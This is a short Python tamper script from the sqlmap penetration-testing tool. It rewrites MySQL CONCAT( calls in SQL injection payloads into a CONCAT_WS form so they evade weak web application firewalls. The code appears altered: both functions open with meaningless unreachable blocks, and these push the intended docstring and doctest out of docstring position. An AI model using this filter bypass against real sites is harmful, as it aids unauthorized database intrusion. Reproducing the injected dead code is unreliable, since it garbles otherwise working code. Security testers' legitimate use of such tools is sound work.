"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST

def dependencies():
    if False:
        while True:
            i = 10
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        i = 10
        return i + 15
    "\n    Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the CONCAT() function\n\n    >>> tamper('CONCAT(1,2)')\n    'CONCAT_WS(MID(CHAR(0),0,0),1,2)'\n    "
    if payload:
        payload = payload.replace('CONCAT(', 'CONCAT_WS(MID(CHAR(0),0,0),')
    return payload